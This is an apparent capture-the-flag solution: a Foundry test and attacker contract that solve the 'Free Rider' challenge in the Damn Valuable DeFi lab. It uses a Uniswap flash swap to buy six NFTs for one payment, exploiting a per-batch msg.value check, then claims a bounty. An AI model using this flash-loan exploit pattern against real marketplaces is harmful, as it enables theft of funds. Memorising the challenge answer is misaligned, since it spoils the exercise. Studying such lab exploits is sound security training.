...
contract FreeRiderChallenge is Test {
    ...
    function test_freeRider() public checkSolvedByPlayer {
        // Aegis sweep -> SC02 logic: _buyOne checks total msg.value (not per item) and pays the NEW
        // owner (the buyer) after transfer. Flash-swap WETH, buy all 6 for one price, claim the bounty.
        FreeRiderAttacker a = new FreeRiderAttacker(
            uniswapPair, marketplace, nft, weth, address(recoveryManager), player
        );
        a.attack();
    }
...
contract FreeRiderAttacker {
    ...
    constructor(
        ...
        FreeRiderNFTMarketplace _mkt,
        DamnValuableNFT _nft,
        WETH _weth,
        address _rec,
        address _player
    ) {
        pair = _pair; marketplace = _mkt; nft = _nft; weth = address(_weth); recoveryManager = _rec; player = _player;
    }

    function attack() external {
        bool wethIs0 = pair.token0() == weth;
        pair.swap(wethIs0 ? PRICE : 0, wethIs0 ? 0 : PRICE, address(this), abi.encode(PRICE));
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        IWETHmin(weth).withdraw(PRICE); // WETH -> ETH

        uint256[] memory ids = new uint256[](N);
        for (uint256 i = 0; i < N; i++) ids[i] = i;
        marketplace.buyMany{value: PRICE}(ids); // pay once, get all 6 + refunds

        for (uint256 i = 0; i < N; i++) {
            nft.safeTransferFrom(address(this), recoveryManager, i, abi.encode(player)); // bounty -> player
        }

        uint256 repay = PRICE * 1000 / 997 + 1;
        IWETHmin(weth).deposit{value: repay}();
        IWETHmin(weth).transfer(address(pair), repay);
    }
